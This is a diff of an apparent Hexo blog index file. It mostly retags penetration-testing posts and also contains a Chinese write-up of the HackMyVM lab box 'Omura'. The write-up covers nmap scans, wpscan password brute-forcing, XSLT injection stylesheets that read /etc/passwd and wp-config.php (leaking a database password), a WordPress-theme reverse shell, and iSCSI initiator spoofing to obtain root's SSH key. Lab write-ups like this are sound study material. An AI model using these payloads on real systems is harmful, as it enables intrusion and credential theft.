@@ -82,13 +82,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> Linux </tag>
+            
+            <tag> XSS </tag>
+            
+            <tag> CSRF </tag>
             
         </tags>
       
@@ -140,8 +142,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
@@ -170,8 +170,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -202,13 +200,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
             
             <tag> 运维 </tag>
+            
+            <tag> Log </tag>
             
         </tags>
       
@@ -232,8 +230,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -264,8 +260,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
@@ -294,8 +288,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -326,8 +318,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
@@ -357,11 +347,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -386,11 +376,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -442,13 +432,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
             
             <tag> windows </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -472,8 +462,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -504,8 +492,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
@@ -534,8 +520,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -566,11 +550,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -595,11 +579,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -624,11 +608,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -653,11 +637,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -682,11 +666,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> Domian </tag>
             
         </tags>
       
@@ -711,11 +695,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> 免杀 </tag>
             
         </tags>
       
@@ -740,11 +724,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> 免杀 </tag>
             
         </tags>
       
@@ -769,11 +753,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> 免杀 </tag>
             
         </tags>
       
@@ -798,11 +782,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> 免杀 </tag>
             
         </tags>
       
@@ -826,8 +810,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -853,8 +835,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -912,9 +892,7 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
-            <tag> 工具 </tag>
+            <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
             
@@ -941,13 +919,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 反序列化 </tag>
             
         </tags>
       
@@ -972,9 +950,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> Docker </tag>
+            
+            <tag> Nodejs </tag>
             
             <tag> 打靶 </tag>
             
@@ -1003,13 +983,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 反序列化 </tag>
             
         </tags>
       
@@ -1034,11 +1014,11 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 笔记 </tag>
             
             <tag> 运维 </tag>
+            
+            <tag> Log </tag>
             
         </tags>
       
@@ -1062,8 +1042,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 笔记 </tag>
             
@@ -1092,8 +1070,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 笔记 </tag>
             
             <tag> 编程 </tag>
@@ -1121,9 +1097,9 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> MongoDB </tag>
             
             <tag> 打靶 </tag>
             
@@ -1152,13 +1128,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> XXE </tag>
             
         </tags>
       
@@ -1182,8 +1158,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 工具 </tag>
             
@@ -1211,8 +1185,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -1243,8 +1215,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 笔记 </tag>
             
             <tag> 运维 </tag>
@@ -1272,13 +1242,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> Docker </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 反序列化 </tag>
             
         </tags>
       
@@ -1303,7 +1275,7 @@
       
         <tags>
             
-            <tag> 网安 </tag>
+            <tag> Docker </tag>
             
             <tag> 笔记 </tag>
             
@@ -1332,13 +1304,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> Xpath </tag>
             
         </tags>
       
@@ -1363,13 +1335,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> Nodejs </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 反序列化 </tag>
             
         </tags>
       
@@ -1394,9 +1368,9 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> Docker </tag>
             
             <tag> 打靶 </tag>
             
@@ -1425,9 +1399,9 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> Docker </tag>
             
             <tag> 笔记 </tag>
             
@@ -1454,11 +1428,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
+            
+            <tag> MongoDB </tag>
+            
+            <tag> NoSQL </tag>
             
         </tags>
       
@@ -1483,13 +1459,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> Jboss </tag>
             
         </tags>
       
@@ -1514,13 +1490,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> Jboss </tag>
             
         </tags>
       
@@ -1545,11 +1521,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 笔记 </tag>
             
             <tag> 运维 </tag>
+            
+            <tag> MongoDB </tag>
+            
+            <tag> NoSQL </tag>
             
         </tags>
       
@@ -1601,13 +1579,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 日志中毒 </tag>
             
         </tags>
       
@@ -1632,13 +1610,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> Checkpoint </tag>
             
         </tags>
       
@@ -1663,13 +1641,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> LD_PRELOAD </tag>
+            
+            <tag> WordPress </tag>
             
         </tags>
       
@@ -1725,13 +1705,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> no_root_squash </tag>
             
         </tags>
       
@@ -1755,8 +1735,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -1787,8 +1765,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
@@ -1818,13 +1794,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> Java </tag>
             
         </tags>
       
@@ -1849,13 +1825,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 隐写 </tag>
             
         </tags>
       
@@ -1880,13 +1856,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> rootkit </tag>
             
         </tags>
       
@@ -1942,13 +1918,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 反序列化 </tag>
             
         </tags>
       
@@ -1973,13 +1949,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> JWT </tag>
+            
+            <tag> OpenAPI </tag>
             
         </tags>
       
@@ -2004,13 +1982,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> ruby </tag>
+            
+            <tag> SSTI </tag>
             
         </tags>
       
@@ -2035,13 +2015,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> WordPress </tag>
             
         </tags>
       
@@ -2054,7 +2034,7 @@
       <link href="/2024/02/05/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E4%BA%94)%E4%B9%8BHMVOmura/"/>
       <url>/2024/02/05/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E4%BA%94)%E4%B9%8BHMVOmura/</url>
       
-        <content type="html"><![CDATA[<p>所渗透的靶机IP为192.168.56.105</p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.56.105</span><br><span class="line">[sudo] mikannse 的密码：</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-05 09:33 UTC</span><br><span class="line">Nmap scan report for 192.168.56.105 (192.168.56.105)</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3260/tcp open  iscsi</span><br><span class="line">MAC Address: 08:00:27:FA:75:8C (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p22,80,3260 192.168.56.105                                             </span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-05 09:33 UTC</span><br><span class="line">Nmap scan report for 192.168.56.105 (192.168.56.105)</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)</span><br><span class="line">|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)</span><br><span class="line">|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span><br><span class="line">|_http-title: XSLT Transformation</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Debian)</span><br><span class="line">3260/tcp open  iscsi   Synology DSM iSCSI</span><br><span class="line">| iscsi-info: </span><br><span class="line">|   iqn.2023-02.omura.hmv:target01: </span><br><span class="line">|     Address: 192.168.56.105:3260,1</span><br><span class="line">|     Authentication: required</span><br><span class="line">|_    Auth reason: Authorization failure</span><br><span class="line">MAC Address: 08:00:27:FA:75:8C (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 95.90 seconds</span><br></pre></td></tr></tbody></table></figure><p>开设了一个Web服务和iscsi服务</p><h1 id="Web-Getshell"><a href="#Web-Getshell" class="headerlink" title="Web(Getshell)"></a>Web(Getshell)</h1><p>主页写可以将XML文件转换为其他格式，暂时不知道怎么用啊。在扫描中发现omura.hmv，添加hosts并扫描子域名，竟然有一个wordpress的子域名，添加</p><p>访问之后，似乎可以爆破密码，存在一个叫做“admin”的用户名</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --url=http://wordpress.omura.hmv/ -P /usr/share/wordlists/rockyou.txt -U admin</span><br></pre></td></tr></tbody></table></figure><p>但是爆破不出来啊，也没有插件漏洞之类的，没思路了（悲</p><p>看看WP所引用的这篇文章</p><p><a href="https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations">https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations</a></p><p>只要能在服务器上存储xsl文件并且访问就可以利用这个漏洞</p><p>在 <a href="http://omura.hmv/">http://omura.hmv/</a> 界面我们就可以上传xsl文件，并且使用的是Saxonica框架。可以读取任意文件</p><p>先创建一个xml.xml(内容好像无所谓)</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>CD Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artist</span>&gt;</span>The artist<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">company</span>&gt;</span>Da Company<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>10000<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>1760<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>然后创建一个read.xsl，用于读取/etc/passwd并输出到生成的XML文档中</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"&gt;</span><br><span class="line">&lt;xsl:template match="/"&gt;</span><br><span class="line">&lt;xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>上传两者之后点击执行，我们成功读取到了内容！</p><p>现在读取/var/www/wordpress目录下的内容</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"&gt;</span><br><span class="line">&lt;xsl:template match="/"&gt;</span><br><span class="line">&lt;xsl:value-of select="unparsed-text('/var/www/wordpress', 'utf-8')"/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>得到的内容是</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">index.phplicense.txtreadme.htmlwordpresswp-activate.phpwp-adminwp-blog-header.phpwp-comments-post.phpwp-config.phpwp-contentwp-cron.phpwp-includeswp-links-opml.phpwp-load.phpwp-login.phpwp-mail.phpwp-settings.phpwp-signup.phpwp-trackback.phpxmlrpc.php</span><br></pre></td></tr></tbody></table></figure><p>读取wp-config.pgp</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"&gt;</span><br><span class="line">&lt;xsl:template match="/"&gt;</span><br><span class="line">&lt;xsl:value-of select="unparsed-text('/var/www/wordpress/wp-config.php', 'utf-8')"/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>得到敏感信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*/ define( 'DB_NAME', 'wordpressdb' ); /** Database username */ define( 'DB_USER', 'admin' ); /** Database password */ define( 'DB_PASSWORD', 'dw42k25MiXT' ); /** Database hostname */ define( 'DB_HOST', 'localhost' ); /</span><br></pre></td></tr></tbody></table></figure><p>得到凭证:admin/dw42k25MiXT</p><p>登录wordpress</p><p>尝试更改index.php为一个php反弹shell</p><p>但是更新的时候报错：</p><p>Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.</p><p> 尝试在右上角将主题改成twenty-two</p><p>开启监听，然后访问:</p><p> <a href="http://wordpress.omura.hmv/wp-content/themes/twentytwo/index.php">http://wordpress.omura.hmv/wp-content/themes/twentytwo/index.php</a></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>转移shell至msf</p><p>还有一个叫做ford的用户</p><p>试着用之前的凭证连接数据库，但是似乎没有什么用。</p><p>也许要用到之前的3260端口了</p><p>根据这篇</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi">https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi</a></p><p>先安装open-iscsi</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get install open-iscsi</span><br></pre></td></tr></tbody></table></figure><p>在靶机上找到文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/sys/kernel/config/target/iscsi/iqn.2023-02.omura.hmv:target01/tpgt_1/acls/iqn.2023-02.omura.hmv:node01.initiator01/fabric_statistics/iscsi_sess_stats</span><br></pre></td></tr></tbody></table></figure><p>说明发起的目标是iqn.2023-02.omura.hmv:node01.initiator01</p><p>编辑kali上的/etc/iscsi/initiatorname.iscsi,添加上:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">InitiatorName=iqn.2023-02.omura.hmv:node01.initiator01</span><br></pre></td></tr></tbody></table></figure><p> 更改/etc/iscsi/initiatorname.iscsi ，取消掉注释</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># Startup settings</span><br><span class="line"></span><br><span class="line">#*****************</span><br><span class="line"></span><br><span class="line"># To request that the iscsi service scripts startup a session, use "automatic":</span><br><span class="line"></span><br><span class="line">node.startup = automatic</span><br></pre></td></tr></tbody></table></figure><p>重启服务</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo systemctl restart iscsid open-iscsi</span><br></pre></td></tr></tbody></table></figure><p>确认目标</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo iscsiadm -m discovery -t sendtargets -p 192.168.56.105</span><br></pre></td></tr></tbody></table></figure><p>连接：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo iscsiadm -m node --login</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></tbody></table></figure><p>发现新增了一块/dev/sdb分区，挂在到一个目录</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mkdir /tmp/omura</span><br><span class="line">sudo mount /dev/sdb /tmp/omura</span><br></pre></td></tr></tbody></table></figure><p>得到一个ssh私钥，可以用于连接root！</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>通过xsl和xml读取文件还是很有趣的233但是iscsi服务就有点冷门了吧，感觉是不会再遇到的233</p>]]></content>
+        <content type="html"><![CDATA[<p>所渗透的靶机IP为192.168.56.105</p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.56.105</span><br><span class="line">[sudo] mikannse 的密码：</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-05 09:33 UTC</span><br><span class="line">Nmap scan report for 192.168.56.105 (192.168.56.105)</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3260/tcp open  iscsi</span><br><span class="line">MAC Address: 08:00:27:FA:75:8C (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p22,80,3260 192.168.56.105                                             </span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-05 09:33 UTC</span><br><span class="line">Nmap scan report for 192.168.56.105 (192.168.56.105)</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)</span><br><span class="line">|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)</span><br><span class="line">|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span><br><span class="line">|_http-title: XSLT Transformation</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Debian)</span><br><span class="line">3260/tcp open  iscsi   Synology DSM iSCSI</span><br><span class="line">| iscsi-info: </span><br><span class="line">|   iqn.2023-02.omura.hmv:target01: </span><br><span class="line">|     Address: 192.168.56.105:3260,1</span><br><span class="line">|     Authentication: required</span><br><span class="line">|_    Auth reason: Authorization failure</span><br><span class="line">MAC Address: 08:00:27:FA:75:8C (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 95.90 seconds</span><br></pre></td></tr></tbody></table></figure><p>开设了一个Web服务和iscsi服务</p><h1 id="Web-Getshell"><a href="#Web-Getshell" class="headerlink" title="Web(Getshell)"></a>Web(Getshell)</h1><p>主页写可以将XML文件转换为其他格式，暂时不知道怎么用啊。在扫描中发现omura.hmv，添加hosts并扫描子域名，竟然有一个wordpress的子域名，添加</p><p>访问之后，似乎可以爆破密码，存在一个叫做“admin”的用户名</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --url=http://wordpress.omura.hmv/ -P /usr/share/wordlists/rockyou.txt -U admin</span><br></pre></td></tr></tbody></table></figure><p>但是爆破不出来啊，也没有插件漏洞之类的，没思路了（悲</p><p>看看WP所引用的这篇文章</p><p><a href="https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations">https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations</a></p><p>只要能在服务器上存储xsl文件并且访问就可以利用这个漏洞</p><p>在 <a href="http://omura.hmv/">http://omura.hmv/</a> 界面我们就可以上传xsl文件，并且使用的是Saxonica框架。可以读取任意文件</p><p>先创建一个xml.xml(内容好像无所谓)</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>CD Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artist</span>&gt;</span>The artist<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">company</span>&gt;</span>Da Company<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>10000<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>1760<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 